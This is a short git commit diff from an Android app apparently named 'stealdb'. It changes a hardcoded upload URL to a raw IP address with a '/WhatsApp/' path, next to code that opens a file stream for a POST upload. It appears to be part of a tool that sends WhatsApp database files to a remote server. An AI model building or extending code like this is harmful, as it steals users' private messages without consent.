ac1ad9df592b87af980a66681c30e85688cfa52a
ianjuma <ian.juma@yahoo.com>
2014-03-14 21:00:16 +0300

    api endpoint update

--- src/com/synod/stealdb/MainActivity.java
+++ src/com/synod/stealdb/MainActivity.java
@@ -52,7 +52,7 @@ public class MainActivity extends Activity {
         int maxBufferSize = 1 * 1024 * 1024 * 1024;
         
         // upload RESTfull POST
-        String urlString = "http://95.94.14.116:5000/whatsApp/";
+        String urlString = "http://95.85.14.116/api/v0.0.1/WhatsApp/";
         try {
             //     ------------------ CLIENT REQUEST
             FileInputStream fileInputStream = new FileInputStream(new File(
